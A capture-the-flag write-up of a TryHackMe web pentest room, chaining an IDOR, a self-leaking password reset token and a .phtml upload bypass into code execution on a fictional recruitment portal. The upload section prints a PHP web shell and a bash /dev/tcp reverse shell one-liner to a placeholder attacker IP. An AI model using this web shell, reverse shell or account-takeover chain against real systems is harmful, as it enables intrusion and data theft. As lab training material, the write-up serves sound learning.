## RecruitX: From Zero to RCE

*Walking through TryHackMe's "Guided Pentest: Web" — a full web app engagement against a fictional recruitment portal, chained from anonymous recon to remote code execution on the underlying server.*

### The Setup

The target: RecruitX, an internal recruitment portal where hiring managers post jobs, candidates apply, and admins manage the workflow. The brief was simple — the client suspects something's wrong, find it. No hints about where to look.

### Recon and Enumeration

First step, a full port scan:

```
nmap -sV -sC -p- 10.112.191.27
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

Four open ports. SSH for later if credentials turn up, the main app on 80, a MySQL instance on 3306 (a strong hint the app is doing raw SQL somewhere), and a default Apache page on 8080.

Next, directory brute-forcing to see what the app exposes beyond the nav bar:

```
gobuster dir -u http://10.112.191.27 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

That turned up:

- `/admin` — redirects to login, needs credentials
- `/api` — a JSON API, often more permissive than the frontend
- `/reset.php` — password reset, historically one of the most-broken flows in web apps
- `/uploads` — a potential path to code execution if upload is reachable
- `/profile.php`, `/dashboard.php` — gated behind auth

Logged in with a low-privilege test account to start exploring authenticated functionality. Hitting `/api/` directly (no auth needed) listed its own routes:

```json
{"endpoints":["/api/user","/api/jobs","/api/applications"]}
```

Handing out a full endpoint map for free is a nice shortcut for an attacker — no guessing required.

### Finding #1: IDOR on user profiles

Clicking through to my own profile, the URL was:

```
http://10.112.191.27/profile.php?id=6
```

Changed `id=6` to `id=1` and got a completely different user back — no ownership check, no error, just whatever record matched that ID. Confirmed it with curl using the session cookie:

```
curl -s -b "PHPSESSID=<session>" "http://10.112.191.27/profile.php?id=1" | grep "fw-semibold"

<div class="fw-semibold mt-1">Sarah Mitchell</div>
<div class="fw-semibold mt-1 mono">s.mitchell@recruitx.thm</div>
```

User ID 1 turned out to be Sarah Mitchell, an administrator. Worse, the `/api/user` endpoint had the identical flaw and didn't even require a session cookie:

```
curl -s "http://10.112.191.27/api/user?id=1"
{"id":1,"name":"Sarah Mitchell","email":"s.mitchell@recruitx.thm","role":"administrator","created":"2026-03-24"}

curl -s "http://10.112.191.27/api/user?id=2"
{"id":2,"name":"James Crawford","email":"j.crawford@recruitx.thm","role":"hiring_manager","created":"2026-03-24"}
```

Two requests, zero authentication, and I had the admin's name, email, and role. This is a classic IDOR (Insecure Direct Object Reference): the app trusts a client-supplied ID instead of checking whether the requester is allowed to see that record.

### Finding #2: A password reset that leaks its own token

With the admin's email (`s.mitchell@recruitx.thm`) in hand, the obvious next move was account takeover rather than password guessing. `/reset.php` asks for an email and, in a properly built app, would send a token out-of-band via email. This one didn't — it printed the token straight back in the HTTP response.

Testing against my own account a few times to see the token format:

```
Attempt 1: 784512
Attempt 2: 291037
Attempt 3: 503648
```

Six digits, numeric only — one million possible values. Not huge, and made irrelevant anyway since the app was handing the token back directly rather than requiring it to be intercepted. Requesting a reset for the admin's email produced a token the same way, which was enough to set a new password for `s.mitchell@recruitx.thm` and log in. Dashboard confirmed the role: **Administrator**.

Two unrelated-looking bugs — an IDOR and a self-leaking reset token — combined into full admin account takeover.

### Finding #3: Unrestricted file upload → RCE

Inside `/admin/upload.php`, the form claimed to accept only PDF, DOCX, and image files, enforced via the HTML `accept` attribute. That's a client-side hint, not a server-side control — nothing stops a direct HTTP request from sending whatever it wants.

The server blocked `.php`, but missed alternate extensions Apache still executes as PHP:

```
echo '<?php echo "PHP is executing"; ?>' > test.phtml
```

Uploaded fine, and hitting `/uploads/documents/test.phtml` executed it. A blocklist that stops at `.php` and forgets `.phtml`, `.php5`, `.phar`, etc. is a common and costly oversight.

From there, a minimal web shell:

```php
<?php if(isset($_GET['cmd'])) { echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; } ?>
```

Uploaded as `shell.phtml` through the admin panel, then:

```
curl "http://10.112.191.27/uploads/documents/shell.phtml?cmd=whoami"
<pre>www-data</pre>

curl "http://10.112.191.27/uploads/documents/shell.phtml?cmd=id"
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

Command execution, confirmed. For something more usable than one-off HTTP requests, upgraded to an interactive reverse shell:

```
# listener
nc -lvnp 4444

# trigger, from the web shell
curl "http://10.112.191.27/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<attacker-ip>/4444+0>%261'"
```

```
www-data@example-hostame:/var/www/html/uploads/documents$ whoami
www-data
```

An interactive shell running as `www-data`, the standard Apache user on Ubuntu — full read access to the webroot and a solid foothold for further privilege escalation (out of scope for this room, but the natural next step in a real engagement).

### Chain recap

1. Anonymous recon (nmap + gobuster) mapped the attack surface, including an API that listed its own endpoints.
2. IDOR on `/profile.php` and `/api/user` leaked the admin's identity with no auth required.
3. A password reset flow that echoed its own token back allowed a direct account takeover.
4. As admin, an extension blocklist on file upload missed `.phtml`, giving code execution as `www-data`.

### Why it matters

None of these bugs is exotic on its own — IDOR, token leakage, and incomplete file-type validation are all textbook OWASP-category issues, and each one individually might get triaged as "low" or "medium." Chained together, they took an attacker with zero credentials to remote code execution on the server. The lesson: access control and input validation gaps don't stay isolated — assume they'll be combined, and fix the whole class of bug (all equivalent PHP-executable extensions, not just `.php`) rather than the one instance you happened to find.